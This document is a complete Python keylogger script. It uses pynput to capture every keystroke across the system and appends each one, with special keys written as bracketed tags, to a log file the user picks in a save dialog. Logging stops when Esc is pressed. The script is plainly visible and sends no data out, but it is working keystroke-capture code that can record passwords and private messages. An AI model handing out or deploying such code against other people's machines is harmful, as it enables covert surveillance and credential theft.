from pynput.keyboard import Key, Listener
from tkinter import filedialog
from tkinter import Tk

def on_press(key):
    with open(log_file, 'a') as f:
        if hasattr(key, 'char'):
            f.write(key.char)
        elif key == Key.space:
            f.write(' ')
        elif key == Key.enter:
            f.write('\n')
        elif key == Key.backspace:
            f.write('[BACKSPACE]')
        elif key == Key.delete:
            f.write('[DELETE]')
        elif key == Key.tab:
            f.write('[TAB]')
        elif key == Key.shift:
            f.write('[SHIFT]')
        elif key == Key.ctrl_l or key == Key.ctrl_r:
            f.write('[CTRL]')
        elif key == Key.alt_l or key == Key.alt_r:
            f.write('[ALT]')
        elif key == Key.esc:
            f.write('[ESC]')
        elif key == Key.up:
            f.write('[UP]')
        elif key == Key.down:
            f.write('[DOWN]')
        elif key == Key.left:
            f.write('[LEFT]')
        elif key == Key.right:
            f.write('[RIGHT]')
        elif key == Key.caps_lock:
            f.write('[CAPSLOCK]')
        elif key == Key.f1:
            f.write('[F1]')
        elif key == Key.f2:
            f.write('[F2]')
        elif key == Key.f3:
            f.write('[F3]')
        elif key == Key.f4:
            f.write('[F4]')
        elif key == Key.f5:
            f.write('[F5]')
        elif key == Key.f6:
            f.write('[F6]')
        elif key == Key.f7:
            f.write('[F7]')
        elif key == Key.f8:
            f.write('[F8]')
        elif key == Key.f9:
            f.write('[F9]')
        elif key == Key.f10:
            f.write('[F10]')
        elif key == Key.f11:
            f.write('[F11]')
        elif key == Key.f12:
            f.write('[F12]')
        else:
            f.write('[' + key.name + ']')

def on_release(key):
    if key == Key.esc:
        return False

root = Tk()
root.withdraw()  # Hide the main window
log_file = filedialog.asksaveasfilename(defaultextension=".txt", filetypes=[("Text files", "*.txt")])
root.destroy()  # Destroy the root window

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
